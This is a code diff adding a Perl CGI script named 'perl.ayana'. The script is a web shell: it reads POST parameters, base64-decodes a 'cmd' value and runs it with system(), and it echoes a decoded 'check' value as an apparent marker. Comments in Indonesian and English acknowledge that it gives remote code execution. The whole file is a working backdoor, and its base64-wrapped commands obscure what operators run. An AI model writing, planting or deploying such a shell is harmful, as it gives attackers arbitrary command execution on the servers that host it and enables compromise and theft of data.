@@ -1,0 +1,59 @@
+#!/usr/bin/perl -I/usr/local/bandmin
+use strict;
+use warnings;
+use MIME::Base64;
+
+# =============================================================
+# perl.ayana
+# - Baca POST body, decode percent-encoding, decode base64
+# - Menampilkan 'check' (decoded), lalu menjalankan 'cmd' (decoded)
+# - PERINGATAN: execing decoded input = RCE (unsafe)
+# =============================================================
+
+# Print HTTP header
+print "Content-type: text/html\n\n";
+
+# Only handle POST requests
+if ( $ENV{'REQUEST_METHOD'} && $ENV{'REQUEST_METHOD'} eq 'POST' ) {
+
+    # Read raw POST payload according to CONTENT_LENGTH
+    my $in_raw = '';
+    my $len = $ENV{'CONTENT_LENGTH'} || 0;
+    if ( $len > 0 ) {
+        read( STDIN, $in_raw, $len );
+    }
+
+    # Split by '&' into key=value pairs
+    my @pairs = split( /&/, $in_raw );
+    my %in;    # store parsed params (multiple values separated by \0)
+
+    foreach my $pair (@pairs) {
+        next unless defined $pair and length $pair;
+        $pair =~ s/\+/ /g;                      # plus -> space
+        my ( $key, $val ) = split( /=/, $pair, 2 );
+        $key //= '';
+        $val //= '';
+
+        # Percent-decode %HH sequences
+        $key =~ s/%([0-9A-Fa-f]{2})/chr(hex($1))/ge;
+        $val =~ s/%([0-9A-Fa-f]{2})/chr(hex($1))/ge;
+
+        # If key exists already, append with null separator (same behavior as original)
+        $in{$key} .= "\0" if defined $in{$key};
+        $in{$key} .= $val;
+    }
+
+    # If 'cmd' param present: print decoded 'check' and execute decoded 'cmd'
+    if ( defined $in{'cmd'} && length $in{'cmd'} ) {
+        # decode_base64 may die on invalid input; original suppressed errors — keep same behavior
+        my $check_decoded = eval { decode_base64( $in{'check'} // '' ) } // '';
+        print $check_decoded;
+        print "<pre>";
+
+        # UNSAFE: executes decoded command
+        my $cmd_decoded = eval { decode_base64( $in{'cmd'} ) } // '';
+        system($cmd_decoded);
+
+        print "</pre>";
+    }
+}
